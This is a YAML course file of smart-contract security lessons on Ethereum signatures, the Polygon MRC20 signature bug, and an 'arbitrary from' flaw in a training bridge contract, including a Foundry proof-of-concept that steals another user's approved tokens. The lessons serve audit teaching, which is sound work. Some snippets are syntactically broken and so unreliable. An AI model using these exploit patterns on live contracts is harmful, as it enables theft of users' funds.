        description: 'ZkSync & Boss Bridge Code Analysis - Reentrancy Guard, Message Utils, Pausable Library. Focuses on adding an emergency stop and preventing re-entrancy attacks.'
      -
        id: 81494f55-5d9c-48cf-848d-fe09ad1fc05f
        type: new_lesson
        enabled: true
        title: Signatures
        slug: signatures
        duration: 6
        video_url: 1ZNP8H02sscgO0000O02b00I19008ik4oDgK2yZXmp02V6fzwM
        raw_markdown_url: /routes/security/7-bridges/12-signatures/+page.md
        markdown_content: |-
          ---
          title: Signatures Introduction
          ---



          ---

          # Deep Dive into Message Hash Utils: A guide to Signature Message Hash Utilities in Blockchain

          In this post, we're going to delve into signature message hash utilities which are used to produce digests to be consumed by Elliptic Curve Digital Signature Algorithm (ECDSA) for recovery or signing. If you're new to blockchain technology, it might all sound like Greek mythology, but worry not. We're going back to basics - courtesy of the [Anders Brownworth Blockchain demo](https://andersbrownworth.com/blockchain).

          ## Understanding the Blockchain Demo

          Anders Brownworth has created a simple, yet intuitive public-private key demo that has been of great educational help in understanding blockchain better. Unfortunately, the demo has recently been taken down but, the good news is you can find it on [GitHub](https://github.com/anders94/public-private-key-demo).

          A simple `git clone` will get you started but ensure that you have node JS installed beforehand.

          ```bash
          git clone https://github.com/anders94/public-private-key-demo
          cd public-private-key-demo
          npm install
          ./bin/www
          ```

          You're now successfully running the blockchain demo on your local machine! Visit `localhost` on your web browser while the server is still running and TADA, behold the blockchain demo.

          ## Unraveling Signatures

          > "Signature is a process where a private key is combined with a message to create a unique message signature. The process verifies that the public key and the message match the signature."

          This process of signing transactions with private keys is how blockchain works.

          Example: When we operate digital wallets, like MetaMask, and make transactions using Ethereum, we sign these transactions and send these signed messages onto the blockchain. Other blockchain nodes verify these messages.

          In the blockchain demo, you can generate a pair of private and public keys. Sign a message using your private key and visually follow the entire process.

          ![](https://cdn.videotap.com/I31ISMCAE8CABrMXYyaq-89.18.png)

          ## Exploring Message Hash Utils

          `MessageHashUtils` might look a bit confusing, but it's an effort to standardize the messages and hashes in the Ethereum blockchain transactions. Some Ethereum Improvement Proposals (EIPs) have been introduced to enhance this.

          The first one to consider is `ERC-191`, a standard for signed data, and is specifically targeted for signed data in Ethereum Smart contracts. The motive behind this was to establish a common format for all signed data.

          ![](https://cdn.videotap.com/7kCHT85kigZxan9r7aki-109.png)

          According to `ERC-191`, the data is arranged in the following manner:

          - The start of the signed data is marked by `0x19` (1 byte)
          - It's followed by ‚Äòversion specific‚Äô data (1 byte)
          - Additionally, the generic data to sign

          The next version is the `EIP-712` or the structured data, which we will discuss in details in the later part of this blog.

          For the signed data, all signatures in blockchain comprise of `r, s, and v` parameters.

          Let's see an example using Solidity `0.8.0`.

          ```js
          function execute(address target,uint256 nonce,bytes memory payload,uint8 v,bytes32 r,bytes32 s) public {
              bytes memory data = abi.encode(target,nonce,keccak256(payload),msg.sender);
              bytes32 digest = keccak256(abi.encodePacked("\x19\x01",DOMAIN_SEPARATOR,keccak256(data)));
              address recoveredAddress = ecrecover(digest, v, r, s);
              require(recoveredAddress == msg.sender,"Invalid signature");
              (bool success,) = target.call(payload);
              require(success, "Execution failed.");}
          ```

          In the code above, `r`, `s`, and `v` are components of the signed data. In order to verify who signed this message, you can use a precompiled function known as `ecrecover`. The `ecrecover` function takes in the parameters `v`, `r`, and `s` and returns the address that was used to sign the hash. The example above checks if the recovered address matches the sender's address, indicating that the sender indeed signed the bytes.

          The function of `ecrecover` is to identify the signer of the hash, i.e, who signed the data. This function is instrumental in Solidity contracts because it helps verify if a certain person signed something.

          ## Wrapping it up

          In conclusion, message hash utilities are used to enhance transparency and uniformity in signing messages and contracts in the Ethereum blockchain. We also explored how Solidity's `ecrecover` function can be used to identify the signer of data. This essentially aids in the process of verification of a signed contract, thus adding another layer of trust and security to the blockchain technology.
        description: 'Patrick introduces the ERC-191 signed data format and how signatures are used in the EVM. Discusses the ecrecover precompile.'
      -
        id: db5df59f-e075-4e05-b165-d7e649cedc6b
        type: new_lesson
        enabled: true
        title: 'Signatures Summarized'
        slug: signatures-summarized
        duration: 1
        video_url: XzLvDRREawshom6LTDaRubvu1fEEbMx00zSFWhGOAju8
        raw_markdown_url: /routes/security/7-bridges/13-signatures-summarized/+page.md
        markdown_content: |-
          ---
          title: Signatures Summarized
          ---

          _Follow along with this video:_



          ---

          # Decoding Cryptographic Signing: Private Keys, Messages, and Signature Verification

          If you're taking your first steps into the world of blockchain or cryptography, you've probably stumbled across the terms private key, messages, digital signatures, etc. In this blog post, we'll break down the fascinating process of signing messages using private keys. No worry if these terms seem to be Greek to you right now, all will get clearer as you read further.

          ## What Does Signing Messages Actually Mean?

          When we refer to 'signing' in the context of blockchain and cryptography, we're talking about a process by which we authenticate messages on the blockchain using a private key. It's a crucial aspect of data and transaction security.

          Now you might ask, what does signing a message involve and how does it work? Let's break it down a bit.

          > Initially, the process starts with two distinct elements: a private key and a message.

          ![](https://cdn.videotap.com/1RO5OQCrdWw5Vd9SjdCN-14.67.png)

          The content of the messages we refer to usually includes data elements like function signatures, function selectors, parameters, etc.

          ### The Magic Box: The Elliptic Curve Digital Signature Algorithm

          These components, the private key and message, are then pushed into a fascinating 'algorithmic machine' known as the Elliptic Curve Digital Signature Algorithm (ECDSA). Now, unless you're deeply interested in cryptography, you probably don't need to understand the complex math behind it.

          Hence, you can imagine the ECDSA as a magic box, a black box if you will. If you're curious about the inner mechanisms of this 'black box', I highly recommend a deep dive into the Elliptic Curve Cryptography- an excellent starting point could be [this link](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography).

          ![](https://cdn.videotap.com/2RjUzLDQpobVxdX7u9lT-23.83.png)

          ### The Output: VR and S

          Once we feed the private key and message into the black box, the ECDSA, it gives us two outputs, famously known as VR and S. These components make up our unique Digital Signature.

          ![](https://cdn.videotap.com/IQH3FxNz2xIA59h8rO4F-29.33.png)

          ## Full Circle: Verifying the Signature

          Amazingly, we can use this digital signature, the VR and S, to verify that a message was, indeed, signed by a specific address. This gives a receiver the confidence that the message they received was indeed from the sender it claims to be.

          In simpler terms, this tells us that the sender of the message is the legitimate owner of the address from which the message was sent, bringing us to the very essence and necessity of cryptographic signing - Authentication and Verification.

          ![](https://cdn.videotap.com/eNLThyvbZVxz4fr0PJHT-36.67.png)

          To wrap it up, Message Signing and Signature Verification is a simple and secure method to verify the integrity of messages, transactions, and data on the Blockchain. It is an integral part of the blockchain infrastructure, ensuring that addresses and their transactions remain authentic and secure.

          In the fast-evolving world of blockchain and cryptography, understanding such key concepts is not only essential but also engaging. It peels back the layers of the complex systems we often use without understanding and puts power back into the hands of users. Whether it's to enhance your professional knowledge or simply for the thrill of learning something new, delving into the wonder of cryptography is remarkably worthwhile. I highly recommend continuing your cryptographic journey from here, you never know where it might lead you next.

          Stay curious, keep learning, and until the next post, Happy Cryptography!
        description: 'Learn how the ECDSA (elliptic curve digital signature algorithm) is leveraged in transactions to verify signatures.'
      -
        id: 226a2d46-7507-450c-97bc-f00a65b744e2
        type: new_lesson
        enabled: true
        title: EIP-712
        slug: eip-712
        duration: 4
        video_url: vdP00zrEelCOIE244w02FPCcWzk01PD7O9nTK01hp9STveE
        raw_markdown_url: /routes/security/7-bridges/14-eip-712/+page.md
        markdown_content: |-
          ---
          title: EIP-712
          ---



          ---

          # Untangling the Beauty of Smart Contracts: A Dive Into EIP 712 Structured Data

          Smart contracts have revolutionized the way we do transactions and communicate data in the blockchain arena. At the crux of it all lies `MessageHashUtils`, a fundamental tool that greatly simplifies our interactions with these contracts. In this post, we'll take a closer look at the EIP 712 and EIP 191 hash functions, and demonstrate their implementation in an actual contract.

          Remember, smart contracts and untangling their complexities might feel intimidating, but once you get the hang of it, it's an engaging puzzle worth solving. So let's get started!

          ## Breaking Down EIP 712 and EIP 191

          Introducing, the **EIP 712** and **EIP 191**! These are hashing and signing standards for Ethereum smart contracts, making the signing process easier for users.

          Before these standards, users were just told 'hey, sign this message,' and a cryptic byte string was shown. With the advent of EIP 712, Ethereum made user experience way better with formatted requests: 'hey, sign this message: from, to, contents'.

          Are you a fan of typed, structured data instead of just byte strings? Well, EIP 712 is perfect for you!

          For those who want to do a deep dive, you can read more about the implementation of EIP 712 and EIP 191 [here](https://eips.ethereum.org/EIPS/eip-712) and [here](https://eips.ethereum.org/EIPS/eip-191) respectively.

          ![](https://cdn.videotap.com/Q9EBgPOu5axhNmcCfrNw-49.3.png)

          ## Working with EIP 712: An Example

          To illustrate how to work with EIP 712, let's look at a simple example. We've defined a struct `Mail`, with struct `Person`(from, to) and string contents. This is our structured data. After this, we can break the signed message into its essential components - `V`, `R`, and `S`, and verify this signed data using the `verify` function from the EIP 712 hashing contract (refer to the [github repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23)).

          ![](https://cdn.videotap.com/3vXpOBtPGNOYDzTe7xew-92.43.png)

          ## Verifying the Magic: EIP 712 Verification

          Now that we've signed the data, how do we verify it?

          The `ECRRecover` function of Solidity comes in handy here. The function hashes the data into a format called a 'digest'. The `ECRRecover` then checks whether the 'from' component of the message is correct using specific input parameters.

          > Don't miss out on learning more about how important `ecrecover` is by checking out the Solidity documentation [here](https://docs.soliditylang.org/en/v0.8.23/smtchecker.html#function-calls).

          NOTES

          1. The digest is essentially the hashed data put into a specific format.
          2. Breaking the signed message into `V`, `R`, `S` components forms the input for `ecrecover`.

          You can explore a bit more about this part with a practical example in the `Example.sol` contract in the course's GitHub repository.

          ![](https://cdn.videotap.com/3Bx9eDqrngeXdafn4LDv-197.19.png)

          ## Let's Watch a Mistake: Polygon Case Study

          Ordinarily, low-level signature signing seems like a tedious task. But here's an interesting case study on how forgetting to double-check a precompiled `ECRRecover` function return value led to an exploitable vulnerability on Polygon...

          ![](https://cdn.videotap.com/BjhKxp4Deaz9YZi3bwyj-215.68.png)

          ## Wrapping Up

          So that's a quick run-through on `EIP 712` and `EIP 191`, two important specifications that make handling and signing Ethereum smart contracts a breeze. Though it might seem a little complex, with a bit of practice, you'll find it's not so scary after all! Don't forget to check out the next part where we dive into a Polygon case study. Happy coding!
        description: 'We dive into EIP-712 and introduce typed structured data hashing and signing with minimalistic examples.'
      -
        id: 18c9b150-0b32-4eb9-9372-ce2497d2656b
        type: new_lesson
        enabled: true
        title: 'Case Study: Polygon'
        slug: polygon
        duration: 9
        video_url: 7WW5yHQv7mvZuW9qM4Lu4G2DdUU101LcSXVAk6zk8jzI
        raw_markdown_url: /routes/security/7-bridges/15-polygon/+page.md
        markdown_content: |-
          ---
          title: Case Study - Polygon Precompile
          ---



          ---

          # Hunting for smart contract bugs: How a developer identified a $7 billion exploit

          If you fancy yourself a tech-savvy problem solver or a capable and competent coder, the world of smart contract bug bounties could be your next lucrative adventure. Not only are these exploits well-paying when correctly identified, but they also aid in securing the ecosystem against hackers.

          I recently had the occasion to interview a developer who discovered a $7 billion bug and was rewarded with $2.2 million for his conscientious reporting of this vulnerability. By exploring his successful case, we can learn the key strategies and tools you'll need to find your million-dollar bounty.

          Let's delve into this intriguing world of hunting for smart contract bugs.

          ## Matic blockchain, Polygon, and the MRC20 contract

          On May 31, 2020, the Matic blockchain, which later rebranded as the Polygon chain, was launched. An [EVM](https://ethereum.org/en/developers/docs/evm/) compatible blockchain, it's known for its low gas fees, rapid block times, and recent ventures into [ZK technology](https://polygon.technology/polygon-zkevm).

          If we return to the beginning, block zero to be precise, we find ten transactions in this Genesis block. One of these transactions created the MRC20 contract. This contract allowed users to sign a transaction without sending it, meaning they could offset gas costs. For example, somebody else could be responsible for these costs. This technique is referred to as a metatransaction, which is better explained in [EIP 712](https://eips.ethereum.org/EIPS/eip-712). Initiated with almost 10 billion MATIC, this contract facilitated these gasless transactions. However, it concealed a critical exploit, an oversight that could potentially empty the contract of its entire content.

          ## The discovery of the dormant exploit

          On December 3, 2021, Leon Spacewalker (a pseudonym of our developer hero) submitted a report about this potential vulnerability to Immunify. Less than two days later, another astute individual discovered this exploit. Unfortunately, this other individual was a malicious hacker and successfully pilfered 800,000 MATIC tokens from the contract.

          Polygon was forked two days after the initial report, and the contract was swiftly mended. From December 5, 2021, the MRC20 contract was no longer vulnerable to this exploit.

          But what exactly was this bug, and how did it remain unidentified for so long? Let's turn our attention to the function that enabled these gasless transactions.

          ## Anatomy of the bug - A detailed look

          This function appears benign at first glance. It requires a user's signature, data, and an amount to send, an expiration date, and a recipient for the money. Running certain checks, it retrieves the data hash required for the metatransaction and ensures this data hash hasn't been previously used. Following these steps, it then launches an EC recovery function.

          This recovery function, ecrecover, verifies the origin of a signed transaction. However, should it encounter an error, it simply returns the zero address without viability checks. Even though there is a condition to ensure that this return is not zero, the ececovery function still returns zero upon encountering an error. Herein lies the vulnerability.

          If the function were to check the overall validity of this function and not just the zero address, the problem would've been handled. But alas, that check was overlooked. The transfer function, acting as the last line of defense, should at least verify the 'from' address. But it simply transfers money out of the MRC20 contract without making any such checks.

          The exploit was then straightforward: Just passing a faulty signature, setting any quantity, and denoting a receiver. This method would essentially drain the entire MATIC balance.

          ### Prevalence of dormant bugs in the tech world

          It's both peculiar and surprising that this bug remained latent for about 1.5 years, only to be discovered by multiple individuals within a short span. After discussing with the Immunified team, they provided a remarkable insight: these sleeping exploit beasts' simultaneous awakenings are a fairly common phenomenon. As soon as media outlets popularize new bugs, bug hunters flock to identify them in other plausible places.

          Despite this seemingly random event, we can extract several valuable lessons from this saga.

          ## Strategies to identify bugs

          My conversation with Leon yielded some precious tips and tricks he employed to discover this and numerous other security loopholes. Note that a basic understanding of Solidity and appropriate smart contract fundamentals are desirable assets in watching your million-dollar bounty surface.

          ### 1. Distinct advantage - Find your edge

          Every bug bounty hunter must have a unique advantage. Leon's advice to anyone entering this space, hone that specific skill, that edge over other smart contract developers, bug hunters, and protocols.

          ### 2. Know the subject - Understand the protocol

          Knowing the specifics of the protocol in-depth is one of the most common strategies to find bugs. Reading the documentation, experimenting with the protocol implementation, etc., if you grasp every corner of the protocol, you're likely to identify aberrations as well.

          ### 3. Research and Grow

          Research on specific bugs and uncover projects that have those loopholes. This technique, requiring a solid understanding of diverse exploits and maintaining awareness of unexplored best practices, simplifies your search as you're only seeking a specific chunk of code in a project.

          ### 4. Speed is key

          Being quick in identifying new bounties and updates surely benefits in this context. Equipped with the right tools, such as Immunified discord BBP notifications, one can always stay ahead.

          ### 5. Devising unique strategies - Be creative

          Leon often visited community forums projecting a potential bug bounty. He would then start exploring their smart contracts even before approval to gain a head start.

          ### 6. Arm yourself with the right tools

          Knowledgeable bug hunters use various helpful tools. Solidity Visual Developer, Hard Hat Foundry, Brownie, Dune Analytics, and Etherscan are a few examples.

          ### 7. Audited projects are not bug-free

          Leon has discovered numerous vulnerabilities in projects that top firms had audited. So, do not be disheartened by audited projects.

          ### 8. Find your niche

          Gaining industry-specific knowledge can dramatically improve your ability to uncover bugs.

          Although the example discussed here is quite specific and outlines a single bug hunt, these tips can be generalized for anyone hopeful of winning a sizeable bug bounty.

          Are you prepared to accept the challenge?

          ![](https://cdn.videotap.com/MuftBpuNZSZv4cmAeOuU-506.03.png)
        description: 'We dive into the infamous polygon hack as a case study of bridge exploits.'
      -
        id: 77477bf0-095d-4ce5-93e0-026c4ba36d8b
        type: new_lesson
        enabled: true
        title: 'Signatures Recap'
        slug: signature-recap
        duration: 1
        video_url: N21xX6007LOERBNigJ3lZx1LhiLcZZL9q39ydbdg2qDE
        raw_markdown_url: /routes/security/7-bridges/16-signature-recap/+page.md
        markdown_content: |-
          ---
          title: Signatures Recap
          ---



          ---

          # Understanding the Magic of Digital Signatures and Blockchain: A Simple Tutorial

          Welcome back, fellow blockchain enthusiasts. We've covered a lot in our past discussions, and this post will focus on one of the most fundamental aspects of blockchain technology: digital signatures. By the end of this read, you'd be able to comprehend how digital signatures work and how they are minted using Elliptical Curve Digital Signature Algorithm (ECDSA). Don't worry! We've broken it down into the simplest terms possible.

          ## How Digital Signatures Work

          Digital signatures underpin the integrity and security of transactions within a blockchain ecosystem. These contrivances act as a proof of authenticity, confirming that the message has been sent by a verified sender and has not been tampered with, during transmission.

          ![](https://cdn.videotap.com/jSSntLnGkMJPWVtSFsUs-6.19.png)Here's a simplified snapshot of the digital signature process:

          1. Your Private Key + the Message &gt; **ECDSA** &gt; Output (r,s values) = Signature
          2. Signature + Original Message &gt; **ECDSA Verification** &gt; Sender's Public Key

          ### Elliptical Curve Digital Signature Algorithm

          The core of creating a digital signature is an intelligent mathematical process known as the Elliptical Curve Digital Signature Algorithm, or ECDSA. Essentially, you take the private key and the message and feed them into this algorithm.

          This operation generates a signature in a specific format, often referred to as _r_ and _s_- the crucial parts of your digital signature. These signatures are safe to put on-chain as they do not contain any public information.

          ### Verifying The Signature

          How can we ensure that the message was indeed signed off by the claimed sender? Verification is the process that answers this question.

          You take the signed message plus the reported _r_ and _s_ values and plug them into the verifying component of the ECDSA. Adding the data they supposedly signed results in the output, which is essentially the signatory of the message.

          This verifying component is known as an `ECR precompile`, a part of the elliptical curve digital signature mechanism.

          The magic happens when `ECR precompile` outputs the same person you expect to have signed the message. If it does, then voila! It's an honest transaction, and that's precisely what we want to achieve.

          > "In the world of cryptography and digital transactions, your signature is the cornerstone of credibility."

          ## Wrapping Up

          In summary, a digital signature is akin to your digital fingerprint. With ECDSA's wizardry, a simple, unique combination of values (comprising of a private key, a message and the _r,s_ values) embodies your authority and ensures the authenticity of transactions. Understanding these fundamentals of how signing and verification work is integral to mastering blockchain technology.

          Onwards, to a more secure and transparent future.
        description: 'Elliptic Curve Digital Signature Algorithm & Verification Explained. Emphasis on ecrecover, V, R and S values, and on-chain data protection.'
      -
        id: 0fe0657b-cb48-4847-9ed2-8ac6af842ccc
        type: new_lesson
        enabled: true
        title: 'Recon Continued'
        slug: recon-continued
        duration: 6
        video_url: k6II2HndqksTgobKwPIsL4WuLGwgNvULr00YCkpSmgGE
        raw_markdown_url: /routes/security/7-bridges/17-recon-continued/+page.md
        markdown_content: |-
          ---
          title: Recon (continued)
          ---



          ---

          # Decrypting OpenZeppelin's ECDSA Utility Library: An In-Depth Look

          In the vast world of smart contracts, a significant part of understanding how everything works involves understanding Elliptic Curve Digital Signature Algorithm (ECDSA) operations. ECDSA is crucial in secure data transactions in these systems. In this article, we will delve deep into OpenZeppelin's ECDSA assembly code, dissecting its content and functions.

          ## Understanding ECDSA and OpenZeppelin

          ECDSA and related technologies help sign and validate data. OpenZeppelin is a comprehensive utility library that provides a plethora of functions to cater to these needs. The given transcript discusses two Ethereum functions written in assembly.

          > "These are all basically ways to help sign and validate data. And this is important for us for reasons you'll see in a bit."

          Following this, we have the ECDSA library, sourced from OpenZeppelin, which focuses on elliptical curve digital signature algorithm operations.

          ## ECDSA Implementation: Try Recover Function

          As we progress further into the script, we encounter another core utility `Try Recover`. This function extracts the signature constituents `R`, `S` and `V`‚Äî the value components of the signature all housed in a signature with length 65. An understanding of how `Try Recover` operates is significant in achieving signatures and verifications.

          ![](https://cdn.videotap.com/Groo7EeK5U7DGEFAK2UT-131.57.png)

          The `Try Recover` function retrieves the address responsible for signing a hashed message with a signature or an error, should that arise.

          ## L One Vault &amp; Signatory Examples

          Following this, we introduce L One Vault. As part of subsequent steps, we will take you through some signing examples and elaborate on the ins-and-outs of signing.

          If you're not too familiar with signing or cryptography, I recommend `ChatGPT`.

          ## Deep Diving into the L One Boss Bridge

          The `L1BossBridge` contract uses several features, including Safe ERC20, to process ERC20 tokens smoothly. A feature of this contract is that it deals with only a single token‚Äî `L1Token.sol`.

          ![](https://cdn.videotap.com/IbRV6yoOBBUIBRWA1Ic2-191.37.png)

          The contract also incorporates a deposit limit mechanism that restricts the number of tokens one can deposit. It operates on principles which allow one bridge per token and one vault per token.

          ```javascript
          // Immutable vault and token declaration
          IERC20 public immutable token;
          L1Vault public immutable vault;
          ```

          ![](https://cdn.videotap.com/0eRk64LOa0VdtxK4nKoF-227.25.png)

          To facilitate token movement from L1 to L2, certain user accounts are distinguished as signers. The contract also incorporates event triggers and error handling mechanisms to manage prospective situations effectively.

          ## Contract Approval and Miscellaneous Functions

          Another key feature to note here is the `vault.approveTo` function where the `L1BossBridge` provides max withdrawal power and approves ERC20s inside the vault.

          ```javascript
          // Vault Approval to handle withdrawals
          vault.approveTo(address(this), type(uint256).max);
          ```

          In addition to these, there are more, straightforward functions like `pause` and `unpause` that can halt and resume contract processes.

          Finally, the functionality to set signers is available to the owner only. There is also a provision for disabling an account, prompting necessary questions about handling situations where an account is disabled mid-process.

          ## Conclusion

          Through this exploration, we see the ECDSA utility library's vast potential, specifically OpenZeppelin's library. Not only does it allow for more effective and streamlined worksheet functions within the Ethereum environment, but it also provides a window into secure transactions in the blockchain world.

          Remember, just as the speaker in the transcript alluded, there might be bugs related to signatures, so consider delving into these libraries and try deconstructing them yourself to foster your understanding of how they work.
        description: 'Patrick explains ECDSA signing & verification with OpenZeppelin examples, focuses on signature-related bugs within Boss Bridge.'
      -
        id: bd0cfce8-5121-4244-8dfa-a76a04d30a38
        type: new_lesson
        enabled: true
        title: depositTokenToL2
        slug: deposit-token
        duration: 2
        video_url: I009kVxdv1EopfnFCnpgvb84Z00gxgx8dYaxWxF2CCqxI
        raw_markdown_url: /routes/security/7-bridges/18-deposit-token/+page.md
        markdown_content: |-
          ---
          title: depositTokenToL2
          ---



          ---

          # Understanding the depositTokenToL2 function

          In this blog post, we delve into an essential part of blockchain contract management, especially in relation to the Layer 2 (L2) scaling solutions. One exciting function that facilitates these activities is the `depositTokenToL2` function. It operates in a decentralized environment, orchestrating transactions by locking tokens in the vault and triggering relevant events.

          ![](https://cdn.videotap.com/pfxr2xqJnxlfGXz1ojht-5.66.png)

          This entry aims at delivering a detailed commentary on how this function works, how to utilize it, and why it is an integral cog in dApp operations.

          ## An Overview of `depositTokenToL2` Function

          This function is a fundamental aspect of L2 operation. When you call `depositTokenToL2`, there are nodes in waiting to listen and process it, subsequently unlocking the tokens on the L2. This unlocking initiates the minting process on the L2, which is an essential part of the centralized process of the blockchain operation facilitated by this function.

          In simpler terms, it's like we have built a lock (a vault) and unlocked it with a specially designed key (the L2 minting process).

          It's essential to note the three parameters of this function:

          1. `from`‚Äì the address of the user depositing the tokens
          2. `L2 recipient` ‚Äì the address of the user receiving the tokens on the L2
          3. `amount` ‚Äì the value of tokens to deposit.

          Specifically, the function accepts these parameters when the system is not paused, adhering to the condition that the sum of `balance(address(vault))` and `amount` must not exceed the deposit limit.

          > This function has a limit of 100,000 tokens. This means you can only have a maximum of 100,000 tokens on the Layer 2 network at any given time.

          The function attains token safety through a transfer to the vault's address, scaling the stipulated amount per the deposit limit.

          ![](https://cdn.videotap.com/VZtxKixeFPCh2aosAGVO-59.4.png)

          ## The Importance of Emitted Events

          This function's operation is not complete without an integral event emission: the deposit and unlock events.

          These events, if configured correctly, send vital signals to an off-chain service; hence careful attention must be paid to them when coding or interpreting what this function does.

          The events essentially carry these parameters: `from`, `to`, and `amount`. An off-chain service awaits and listens for these events to facilitate the unlocking of tokens on the L2.

          While this might seem a tad complex, it can be visualized as a messaging system. The function sends messages (events) that inform the system of where it is time to unlock the tokens on L2.

          ```js
          // Example of the function parameters in solidity
          function depositTokenToL2 (address from, address L2Recipient, uint256 amount) external {/* function body*/}
          ```

          ## Wrapping Up

          The `depositTokenToL2` function, with its event emissions and token transfers, is a crucial part of the blockchain's L2 operations. Understanding the principles of such a function can aid anyone on their journey to mastering blockchain contracts and their integration with L2 solutions.

          Get familiar with this type of process and continue your exploration in the vast yet thrilling world of blockchain technology.
        description: "'depositTokenToL2' Function in Brief. The function locks tokens in a vault, triggers L2 minting."
      -
        id: 730a802e-91db-47c4-b9c1-7abdc6fd7e0e
        type: new_lesson
        enabled: true
        title: 'Exploit: Arbitrary From'
        slug: arbitrary
        duration: 3
        video_url: 9bsX7eSOMPhvP9rnvXqx01pX9OeirAfJDT00BxwitEQwk
        raw_markdown_url: /routes/security/7-bridges/19-arbitrary/+page.md
        markdown_content: |-
          ---
          title: Exploit - Arbitrary "from" allows users to steal tokens
          ---



          ---

          # Nail-biting Moments with Slither: Uncovering Critical ERC20 Vulnerabilities

          Hey You! Welcome back! In this post, we'll dig into the enlightening world of Slither, our good friend from [Trail of Bits](https://trailofbits.com/). It is well-equipped to unearth potential code vulnerabilities, and guess what, we've stumbled upon a dicey one! Exciting, right? Buckle up, let's dive in.

          ## The Problem Unveil

          So, revisiting where we left off, we managed to arrive at a critical point at our function with the help of Slither. Quite the Sherlock, isn't it? Well, let me just relay the discovered issue. We discovered the issue with the 'bossbridge deposit tokens to l2' which utilizes 'arbitrary from in transfer from'. Sounds gibberish, right? Let's decode it.

          The issue pops up when a detection is made that "message sender" is not used in 'from in transfer from'. Don't worry, I will walk you through an exploit scenario for clarity (You wouldn't feel good if we don't decode it, and you know it!).

          ## The Exploit Scenario

          Consider our characters, Alice and Bob. Alice approves her ERC20 tokens to be spent by the contract. Enter a malicious entity, Bob, who utilizes this opportunity to call on the contract and set Alice's address as the '`from`' parameter in 'transfer from'.

          Can you guess what happens next?

          > 'Bob takes off with Alice's hard-earned tokens owing to the contract permission established by Alice.'

          Pretty severe, isn't it? This just started becoming more interesting than an Agatha Christie novel!

          ## The Vulnerability In-Depth

          Let's try to visualize this scenario. We have Alice, setting off to perform a transaction after calling '`approve of token to bridge`.' Bob, the opportunist, notices this and decides to make his move. He calls '`depositTokensToL2`', all the while using Alice's address for the '`L2`' recipient, which would now be Bob himself. He sets the amount as all her money (sounds like pure evil!). Alice, unsuspecting, has approved this contract, thus allowing Bob's call to pass.

          This would enable the transfer of all Alice's money to Bob on layer two. A chilling scenario to envision!

          ## Slither - The Hero Unseen

          If it wasn't for Slither grabbing hold of this at audit, the consequent results would be devastating. Figuring out the severity and impact, it's evidently high - Alice would be losing all her tokens to Bob. Depicting the likelihood reveals another elevated risk - this event can transpire anytime Alice calls 'approve'. Consequently, things are looking upwards of 'super high'. While some may tag this as 'crit', we can unanimously agree on labeling it as a 'high audit' critical issue.

          _A critical excerpt from Slither's find - "If a user approves the bridge, any other user can steal their funds"._ Quite hair-raising, isn't it? It's an unintended consequence stemming from trust in contracts ‚Äî certainly not a scenario we envision.

          ## Crafting a Proof of Code

          After such a thrilling ride, let's take a moment to breathe and give a thought to envisaging the proof of code for our discovery.

          Stick around for the next part where we dive deep into writing a foolproof, high-safety code, ensuring vulnerabilities like this are effectively mitigated.

          With this, we‚Äôre signing off for now, continue staying curious and happy coding!\\
        description: "With the help of Slither, Patrick identifies and discusses an 'Arbitrary From' vulnerability."
      -
        id: 96c18ccd-ac6e-466d-96de-d03f565fcd68
        type: new_lesson
        enabled: true
        title: 'Arbitrary From: Poc'
        slug: arbitrary-poc
        duration: 4
        video_url: tjGKINP7sYzrOQSXpLV1bru9aYtRVdMJ6ynAun56KxI
        raw_markdown_url: /routes/security/7-bridges/20-arbitrary-poc/+page.md
        markdown_content: |-
          ---
          title: Arbitrary POC
          ---



          ---

          # Testing Token Movement In Solidity

          In this blog post, we will delve into a test suite in Solidity, focusing on testing the movement of approved tokens from one user to another. By simulating a situation where a malicious actor can swoop in and steal tokens, we will unearth potential vulnerabilities and show how to spot a high-severity bug with a tool like Slither.

          ## Writing A Test Suite Function

          Let us begin by scrolling down to our current test harness. Our primary objective is to pen a new test suite function; we will adopt the name `testCanMoveApprovedTokensOfOtherUsers` for this function. Our mission is to verify an occurrence ‚Äì the actual transfer or move of tokens from one user to another.

          To achieve this, we will repurpose some sections of our existing test suite.

          ![](https://cdn.videotap.com/kSIFNqF1jGk1jsDF3enL-24.57.png)

          Within our current test suite, we have entities such as `user`, `deployer`, `operator`, `token`, `tokenBridge`, and `vault`. We also have a user account named Alice, tagged in this context as 'poor Alice'.

          ## Approving Tokens For Transfer

          First, Alice has to approve the `tokenBridge` to move her tokens to Layer 2. She will just use the L1 Token object (described in code as `L1Token`) and call the `approve` method, passing in the `tokenBridge‚Äôs` address as well as the maximum token number, expressed as `uint256.max`.

          ```js
          VM.prank(Alice);
          L1Token.approve(addressTokenBridge, uint256.max);
          ```

          ![](https://cdn.videotap.com/u94ZnNK43eS6i6Y9HY71-58.98.png)

          ## Defining A Malicious Actor

          After Alice has approved the Token Bridge to lawfully move her tokens, we introduce 'Bob', who maliciously swoops in to steal and deposit all of Alice's tokens on Layer 2. To do this, we first need to obtain the token balance of Alice.

          ```js
          uint256 depositAmount = Token.balanceOf(userAlice);
          ```

          We now need to create an address for our mischief-maker, Bob. Assuming Bob's address as `attackerAddress`, we start a prank with this address and make Bob execute a `depositTokensToL2` call.

          ```js
          address attackerAddress = make.addr(attacker);
          vm.startPrank(attackerAddress);
          ```

          Now, Bob can steal Alice's tokens by depositing them into his own account on Layer 2.

          ```js
          TokenBridge.depositTokensToL2(userAlice, attackerAddress, depositAmount);
          ```

          ## Ensuring Data Integrity With Emit

          In this scenario, we need to emit an event since the tokens are being locked into the `vault`. Emitting the correct details in this event serves an important role as the off-chain service, which listens to these events, triggers the unlocking on Layer 2.

          ```js
          vm.expectEmit(
            addressTokenBridge,
            emitDeposit(userAlice, attackerAddress, depositAmount)
          );
          ```

          ## Asserting The State

          Now, we make assertions to verify that the token balance of Alice is zero and the token vault's balance equals the `depositAmount`.

          ```js
          assertEqual(Token.balanceOf(userAlice), 0);
          assertEqual(Token.balanceOf(addressVault), depositAmount);
          ```

          Once the verification process is complete, we stop the prank.

          ```js
          vm.stopPrank();
          ```

          ## Verifying The Test Case

          On running the test suit, we observe that the test case succeeds, indicating that there's a high-severity bug - easy pickings for a malicious actor.

          This explorative approach reveals how even advanced code bases can fall prey to serious issues, and tools like Slither prove indispensable in identifying them. So, let's continue analyzing with Slither and see what other 'goodies' we can find!

          > "Even in some of these more advanced code bases, tools like Slither can find really good issues. So thank you, Slither. Let's keep walking down, Slither. Let's see what other goodies are in here. This turned out to be a high."
